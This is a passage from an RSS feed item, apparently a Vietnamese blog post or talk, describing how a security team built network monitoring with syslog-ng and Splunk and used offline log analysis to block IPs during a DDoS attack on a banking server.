+<p>Về mặt kỹ thuật, chúng tôi đã cài đặt sẵn các biện pháp kiểm soát tự động trên hệ thống giám sát an ninh mạng, nên các chuyên gia của tôi chỉ phải theo dõi vụ tấn công xem có diễn tiến gì bất thường hay không mà không phải thực hiện thêm bất kỳ thao tác nào. Về mặt hành chính, tôi thông báo cho lãnh đạo doanh nghiệp và các đơn vị như Trung Tâm Chăm Sóc Khách hàng, Trung tâm Vận hành Data Center cũng như mở kênh liên lạc với các ISP để nhờ họ trợ giúp nếu như đường truyền bị quá tải. Như quý vị đã thấy trong một slide ở phía trước, chỉ chưa tới 20′, vừa ngay sau lần kích hoạt hệ thống phòng thủ đầu tiên, vụ tấn công đã được kiểm soát thành công. Hệ thống giám sát an ninh mạng cũng giúp chúng tôi làm các báo cáo để gửi lãnh đạo cũng như gửi các cơ quan điều tra nhờ hỗ trợ truy tìm thủ phạm.</p>
+
+<p>Toàn bộ phương thức giám sát an ninh mạng chỉ đơn giản như thế. Đến đây là chúng ta xong phần 1 của bài trình bày này. Tiếp theo tôi sẽ chia sẻ một số thông tin về hệ thống cũng như công tác giám sát an ninh mạng.</p>
+
+<p>Về mặt kỹ thuật, chúng tôi không mất quá nhiều thời gian cho việc thiết kế hệ thống và lựa chọn giải pháp, bởi vì ngay từ đầu chúng tôi đã xác định đây là một lĩnh vực tương đối mới mẻ, thành ra một giải pháp hoàn chỉnh sẽ không có trên thị trường. Thay vào đó, giống như phát triển phần mềm theo nguyên lý agile, chúng tôi làm vừa làm vừa điều chỉnh.</p>
+
+<p>Chúng tôi khởi đầu bằng việc xây dựng một hệ thống log tập trung. Như đã nói ở trên, đây là công đoạn thu thập dữ liệu. Trong quá trình làm, chúng tôi nhận thấy hầu hết các ứng dụng chạy trên nền UNIX hay các thiết bị mạng đều hỗ trợ sẵn chuẩn syslog, thành ra chúng tôi quyết định chọn phần mềm mã nguồn mở syslog-ng làm công cụ chính để thu thập log.</p>
+
+<p>Tuy nhiên có hai vấn đề: các máy chủ Windows mặc định không hỗ trợ syslog; và một số ứng dụng do chúng tôi tự phát triển hay mua ngoài cũng không hỗ trợ syslog. Đối với vấn đề thứ nhất, chúng tôi cài đặt thêm một phần mềm cho các máy chủ Windows, để đẩy các sự trên trên đó về hệ thống log của chúng tôi. Đối với vấn đề thứ hai, việc đầu tiên chúng tôi làm là xây dựng một quy định về log của các ứng dụng. Trong quy định này chúng tôi yêu cầu tất cả các ứng dụng muốn được cấp quyền chạy trên hệ thống của chúng tôi thì phải thỏa mãn các tiêu chí về log các sự kiện. Chúng tôi cũng hướng dẫn và cung cấp thư viện phần mềm mẫu để các lập trình viên có thể tích hợp vào phần mềm có sẵn của họ.</p>
+
+<p>Syslog-ng là một phần mềm mã nguồn mở tuyệt vời. Nó hoạt động cực kỳ ổn định, bền vững. Trong suốt hơn 3 năm triển khai hệ thống này, chúng tôi chưa bao giờ gặp sự cố ở phần mềm này. Nhưng syslog-ng cũng chỉ làm tốt nhiệm vụ thu thập dữ liệu, làm sao phân tích dữ liệu đó? Trên thị trường lúc bấy giờ có khá nhiều công cụ giúp giải quyết vấn đề này. Chúng tôi lần lượt thử nghiệm các công cụ này, và rồi chúng tôi phát hiện ra Splunk. Chúng tôi hay gọi phần mềm này là “Splunk toàn năng”. Một công cụ phân tích dữ liệu trên cả tuyệt vời!</p>
+
+<p>Splunk rất hay, nhưng nếu không có các chuyên gia có kỹ năng phân tích dữ liệu để khai thác Splunk thì hệ thống cũng sẽ không đem lại nhiều ích lợi. Cái hay của Splunk là ở chỗ nó đã làm cho công việc phân tích log tưởng như nhàm chán trở nên cực kỳ thú vị. Chỉ trong một thời gian ngắn, nhân viên của tôi đã bị Splunk mê hoặc. Cái tên “Splunk toàn năng” cũng là do anh ấy đặt cho Splunk. Thành ra chúng tôi cũng không mất quá nhiều thời gian để huấn luyện, bởi vì tự bản thân giải pháp nó đã đủ thú vị để cuốn hút con người chủ động tìm hiểu nó.</p>
+
+<p>Điều tối quan trọng nhất đối với một hệ thống giám sát an ninh là khả năng phân tích một lượng dữ liệu lớn một cách nhanh chóng. Splunk làm rất tốt việc này. Tuy vậy trên thị trường vẫn có các giải pháp khác hoàn toàn miễn phí như tôi liệt kê ở trên. Bản thân tôi cho rằng Hadoop + Scribe + Hive là một hướng nghiên cứu nhiều tiềm năng.</p>
+
+<p>Với hệ thống này, bây giờ chúng tôi có thể an tâm rằng tôi có thể biết được chuyện gì đang diễn ra trên hệ thống mạng của các khách hàng của chúng tôi ngay tại thời điểm tôi đang viết những dòng này.</p>
+
+<p>Về phía lãnh đạo doanh nghiệp, họ cũng an tâm khi biết rằng, chúng tôi có thể phát hiện, truy vết và đối phó lại với bất kỳ sự cố ANTT nào diễn ra trên hệ thống của họ. Thực tế là từ khi triển khai giải pháp này, chúng tôi giải quyết được 100% các sự cố an toàn thông tin trên hệ thống của các khách hàng của chúng tôi.</p>
+
+<p>Ngoài ra hệ thống này còn giúp chúng tôi phát hiện và xử lý hơn phân nửa các sự cố an toàn thông tin. Có rất nhiều tình huống, nếu không có sự hỗ trợ của hệ thống này, chúng tôi sẽ không thể giải quyết được vấn đề. Lại quay lại với câu chuyện bị tấn công DDoS ở trên.</p>
+
+<p>Nhắc lại, một khách hàng của chúng tôi từng bị tấn công DDoS trên diện rộng vào hệ thống máy chủ Internet Banking. Ở thời điểm cao trào, có hơn 10000 IP gửi hàng ngàn request/s đến máy chủ của họ. Làm thế nào để nhanh chóng lấy ra được danh sách 10000 IP này, ngăn chặn chúng trên hệ thống firewall, mà không chặn nhầm khách hàng? Làm thế nào để có thể tự động hóa quá trình trên, chẳng hạn như cứ mỗi 15′ sẽ lấy ra danh sách các IP đang tấn công, cập nhật bộ lọc của tường lửa?</p>
+
+<p>Với hệ thống này, chúng tôi chỉ cần soạn thảo một đoạn script ngắn để lấy ra danh sách IP đang gửi hơn 100 request/s rồi cài đặt chương trình để tự động cập nhật bộ lọc của firewall mỗi 15′. Một vấn đề tưởng như nan giải có thể giải quyết nhanh gọn lẹ và rất rẻ.</p>
+
+<p>Các giải pháp chống DDoS sẽ có 2 thành phần chính: phát hiện và đánh chặn. Các giải pháp có sẵn trên thị trường như các thiết bị của các hãng lớn hay các giải pháp mở như Iptables + Snort inline thường cố gắng phân tích các packet/request để phân loại chúng theo thời gian thực. Nghĩa là khi có một packet/request đi vào, các giải pháp này sẽ cố gắng xác định xem packet đó có phải là một phần của vụ tấn công hay không, nếu phải thì thực hiện đánh chặn.</p>
+
+<p>Sự khác biệt của giải pháp của chúng tôi so với các giải pháp chống DDoS đang có trên thị trường là chúng tôi không cố gắng phân loại và ngăn chặn các packet/request theo thời gian thực. Thay vào đó, <span style="font-weight: bold">chúng tôi tách phần phát hiện ra khỏi hệ thống phòng thủ</span>, và thực hiện phần phát hiện hoàn toàn offline bằng cách sử dụng thông tin từ hệ thống NSM.</p>
+
+<p>Cụ thể, thông tin từ hệ thống đánh chặn cũng như các nguồn khác như web server, proxy hay firewall sẽ được đưa vào hệ thống phân tích để chạy offline, rồi kết quả phân tích này sẽ được cập nhật ngược trở lại cho hệ thống đánh chặn. Với cách làm này, giải pháp của chúng tôi có thể đáp ứng được lượng tải rất lớn vì chúng tôi không phải tốn quá nhiều resource để phân tích on-the-fly một packet hay request như các giải pháp khác.</p>
+
+<p>Về các hướng phát triển trong thời gian tới, tôi thấy một ứng dụng hay ho khác của hệ thống giám sát an ninh mạng là nó giúp chúng tôi có thể đo lường được mức độ an toàn của hệ thống. Có một nguyên tắc lâu đời của quản lý là: chúng ta không thể quản lý những gì chúng ta không thể đo đạc. Do đó để quản lý được an toàn thông tin, chúng ta phải biến an toàn thông tin thành những thông số có thể đo đạc và so sánh được. Đây là một hướng tiếp cận an toàn thông tin từ góc nhìn của người quản lý mà chúng tôi muốn áp dụng cho các khách hàng trong thời gian sắp tới.</p>
+
+<p><strong>Tài liệu tham khảo:</strong></p>
+
+<ul>
+  <li>Ký sự các vụ DDoS vào HVAOnline</li>
+  <li><a href="http://taosecurity.blogspot.com" target="_blank"> http://taosecurity.blogspot.com</a></li>
+</ul>
+
+
+  ]]></description>
+</item>
+
+</channel>
+</rss>
